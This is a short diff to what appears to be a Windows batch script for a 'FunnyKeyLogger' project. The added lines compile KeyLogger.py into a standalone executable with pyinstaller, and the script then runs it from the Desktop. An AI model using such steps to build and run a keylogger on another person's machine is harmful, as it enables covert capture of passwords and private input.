@@ -8,6 +8,10 @@ pip install -r requirements.txt
 
 set desktopPath=%USERPROFILE%\Desktop
 
+cd /d %desktopPath%\FunnyKeyLogger
+
+pyinstaller --onefile 'KeyLogger.py'
+
 cd /d %desktopPath%\FunnyKeyLogger\dist\
 
 KeyLogger.exe
